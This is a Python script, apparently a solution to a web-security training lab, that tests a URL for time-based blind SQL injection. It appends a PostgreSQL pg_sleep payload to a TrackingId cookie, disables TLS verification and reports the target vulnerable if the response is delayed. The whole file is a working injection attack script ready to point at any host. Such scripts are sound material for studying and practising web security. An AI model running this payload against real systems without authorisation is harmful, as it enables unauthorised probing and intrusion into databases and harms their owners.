import urllib.parse
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_time_delay(url):
    payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(payload)
    cookies = {'TrackingId': 'FYgUeEGLEblg2lsZ' + sqli_payload_encoded, 'session' : 'HI6DfppdopgLqwWaSc7lgMMuWh0bat38'}
    r = requests.get(url, cookies=cookies, verify=False)
    delay = r.elapsed
    if int(delay.total_seconds()) > 10:
        print("(+) The query is vulnerable to blind SQL injection")
    else:
        print("(-) Blind SQL injection attempt failed")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 %s <url>" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    print("Causing delay in the query execution...")
    sqli_time_delay(url)

if __name__ == "__main__":
    main()
